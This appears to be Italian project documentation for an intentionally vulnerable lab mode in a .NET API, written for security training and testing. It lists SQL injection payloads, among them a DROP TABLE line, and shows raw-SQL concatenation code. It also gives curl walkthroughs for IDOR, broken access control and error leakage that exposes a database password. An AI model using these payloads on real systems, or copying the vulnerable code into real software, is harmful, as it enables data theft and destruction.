# VAPT Lab Mode

> English version: [VAPT Lab Mode](./en/04-vapt-lab-mode.md)

## Panoramica

**VAPT Lab Mode** è una modalità di sviluppo controllata che espone 4 vulnerabilità di sicurezza **intenzionali** per scopi didattici e di testing. Quando attivato, il servizio diventa volutamente vulnerabile a:

1. **SQL Injection** — concatenazione di stringhe in query raw SQL
2. **IDOR** (Insecure Direct Object Reference) — accesso senza verifica di proprietà
3. **Broken Role-Based Access Control** — bypass dei controlli di autorizzazione
4. **Error Leakage** — esposizione di stack trace e dettagli tecnici

## ⚠️ Attenzione Critica

**NON** attivare VAPT Lab Mode in ambienti di produzione, staging o qualsiasi deployment accessibile da chiunque non sia parte del vostro team di test. Queste vulnerabilità sono **critiche** e violano gli standard di sicurezza.

- ❌ **Mai** in produzione
- ❌ **Mai** in staging
- ✅ **Solo** in ambienti di test locali isolati o VM dedicate

---

## Attivazione

### Opzione 1: Variabile d'ambiente API

```bash
ENABLE_VAPT_LAB_MODE=true dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj
```

Al boot, vedrete nel log:

```
warn: VaptLab
      ╔════════════════════════════════════════════════════════════════╗
      ║  VAPT LAB MODE ENABLED — intentionally vulnerable             ║
      ║  Set ENABLE_VAPT_LAB_MODE=false to restore safe behaviour.   ║
      ╚════════════════════════════════════════════════════════════════╝
```

### Opzione 2: Docker Compose

Modificate `docker/docker-compose.yml` per il servizio `naas`:

```yaml
services:
  naas:
    build: .
    environment:
      - ENABLE_VAPT_LAB_MODE=true
      # ... altre variabili ...
```

### Opzione 3: Frontend (React)

Il front-end ha un banner di avvertimento quando VAPT Lab Mode è attivato. Per attivarlo lato client:

```bash
VITE_ENABLE_VAPT_LAB_MODE=true npm run dev
```

Nel browser vedrete un banner rosso in cima alla pagina che avvisa della modalità vulnerabile.

---

## Le 4 Vulnerabilità

### 1️⃣ SQL Injection

**Endpoint:** `GET /customers?search=<payload>`

**Comportamento sicuro (default):**

```bash
curl "http://localhost:8000/customers?search=' OR '1'='1' --" \
  -H "Authorization: Bearer $TOKEN"

# Risultato: cerca letteralmente per il testo "' OR '1'='1' --" (nessun match)
```

**Comportamento vulnerabile (VAPT Mode):**

```bash
# Stesso comando — il payload SQL viene eseguito direttamente
# La query ritorna tutti i clienti (bypassa il WHERE)
```

**Payload di test:**

```sql
' OR '1'='1' --
' UNION SELECT 1,2,3,4,5 --
'; DROP TABLE customers; --
```

**Codice vulnerabile (in Program.cs, L529+):**

```csharp
if (vaptLabMode && db.Database.IsRelational())
{
    var rawSql = $"""SELECT "Id","Name","Email","CodiceFiscale","CreatedAt"
                    FROM customers WHERE "Name" ILIKE '%{search}%'""";
    return Results.Ok(await db.Customers.FromSqlRaw(rawSql).ToListAsync());
}
```

---

### 2️⃣ IDOR (Insecure Direct Object Reference)

**Endpoint:** `GET /projects/{id}`, `PUT /projects/{id}`, `DELETE /projects/{id}`

**Scenario di test:**

1. Registrate e autenticate due utenti: `alice` e `bob`
2. Alice crea un progetto → ottiene ID `5`
3. Bob tenta di accedere al progetto di Alice usando lo stesso ID

**Comportamento sicuro (default):**

```bash
# Bob — con token di bob
curl "http://localhost:8000/projects/5" \
  -H "Authorization: Bearer $BOB_TOKEN"

# Risultato: 403 Forbidden (progetto appartiene ad Alice)
```

**Comportamento vulnerabile (VAPT Mode):**

```bash
# Stesso comando — ritorna il progetto di Alice (200 OK)
# Bob può leggere, modificare e cancellare i progetti di chiunque
```

**Punti di vulnerabilità:**

- `GET /projects/{id}` — legge progetto di altri utenti
- `PUT /projects/{id}` — modifica progetto di altri utenti
- `DELETE /projects/{id}` — cancella progetto di altri utenti

---

### 3️⃣ Broken Role-Based Access Control

**Endpoint:** `GET /admin/stats`

**Setup:** Create un utente con username `admin` (JWT riceve automaticamente il claim `role=admin`)

**Comportamento sicuro (default):**

```bash
# Utente non-admin
curl "http://localhost:8000/admin/stats" \
  -H "Authorization: Bearer $USER_TOKEN"

# Risultato: 403 Forbidden (ruolo non "admin")
```

**Comportamento vulnerabile (VAPT Mode):**

```bash
# Stesso comando — ritorna le statistiche (200 OK)
# Qualunque utente autenticato può accedere ai dati admin
```

---

### 4️⃣ Error Leakage

**Endpoint:** Tutti gli endpoint (trigger via endpoint `/vapt/trigger-error`)

**Comportamento sicuro (default):**

```bash
curl "http://localhost:8000/vapt/trigger-error" \
  -H "Authorization: Bearer $TOKEN"

# Risultato: 500 + risposta generica:
# {
#   "status": "error",
#   "message": "An unexpected error occurred. Please contact support.",
#   "requestId": "abc123"
# }
```

**Comportamento vulnerabile (VAPT Mode):**

```bash
# Stesso comando — espone stack trace completo + credenziali hardcoded:
# {
#   "status": "error",
#   "message": "An unexpected error occurred...",
#   "requestId": "abc123",
#   "exception": "System.Exception: Test exception...",
#   "stackTrace": "at NoAsAService.Api.Program...",
#   "innerException": "...",
#   "vapt_note": "VAPT LAB MODE: technical details exposed intentionally",
#   "database_password": "DevPassword123456"
# }
```

---

## Test Automatici

Tutti gli scenari VAPT sono coperti da test automatici in [VaptSecurityTests.cs](../src/tests/NoAsAService.Api.Tests/VaptSecurityTests.cs):

```bash
dotnet test src/tests/NoAsAService.Api.Tests/NoAsAService.Api.Tests.csproj \
  --filter VaptSecurityTests -v normal
```

I test verificano che:

- ✅ Modalità sicura blocca ogni attacco
- ✅ Modalità VAPT espone la vulnerabilità come previsto

---

## Flow di Test Consigliato

### 1. SQL Injection

```bash
# 1. Start server in VAPT mode
ENABLE_VAPT_LAB_MODE=true dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj

# 2. Create a customer
curl -X POST http://localhost:8000/customers \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test Corp", "email": "test@corp.test", "codiceFiscale": "TESTCORP123A0150"}'

# 3. Search with SQLi payload
curl "http://localhost:8000/customers?search=' OR '1'='1' --" \
  -H "Authorization: Bearer $TOKEN"

# Expected: In VAPT mode, returns ALL customers (injection successful)
```

### 2. IDOR

```bash
# 1. Register alice and bob
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "Pass123456"}'

curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "bob", "password": "Pass123456"}'

# 2. Alice creates a project (note returned id)
curl -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{"name": "Secret Project", "customerId": 1}'

# 3. Bob accesses Alice's project by ID
curl http://localhost:8000/projects/5 \
  -H "Authorization: Bearer $BOB_TOKEN"

# Expected: In VAPT mode, Bob can read it (403 in safe mode)
```

### 3. Broken Role

```bash
# 1. Create admin user (username="admin")
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "Pass123456"}'

# 2. Create regular user
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "normaluser", "password": "Pass123456"}'

# 3. Regular user tries /admin/stats
curl http://localhost:8000/admin/stats \
  -H "Authorization: Bearer $NORMALUSER_TOKEN"

# Expected: In VAPT mode, succeeds (403 in safe mode)
```

### 4. Error Leakage

```bash
# Trigger error endpoint (available in both modes)
curl http://localhost:8000/vapt/trigger-error \
  -H "Authorization: Bearer $TOKEN"

# Expected: In VAPT mode, response includes stack trace + "database_password"
```

---

## Disattivazione

Per tornare a modalità sicura:

```bash
# Option 1: Restart senza variabile ENABLE_VAPT_LAB_MODE
dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj

# Option 2: Explicitly set to false
ENABLE_VAPT_LAB_MODE=false dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj

# Option 3: Docker Compose
docker compose down
# Modify docker-compose.yml to remove ENABLE_VAPT_LAB_MODE=true or set to false
docker compose up
```

---

## Scenari di Utilizzo

✅ **Appropriato per:**

- Lezioni di sicurezza applicativa (dev teams)
- Penetration testing interno autorizzato
- Validazione di test automatici di sicurezza
- Sandbox di training isolati

❌ **Non appropriato per:**

- Deployment pubblici
- Ambienti di produzione
- Demo pubbliche senza avvertimento esplicito
- Qualunque situazione non controllata

---

## Riferimenti

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-639: IDOR](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-639: Broken Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [Test file](../src/tests/NoAsAService.Api.Tests/VaptSecurityTests.cs)
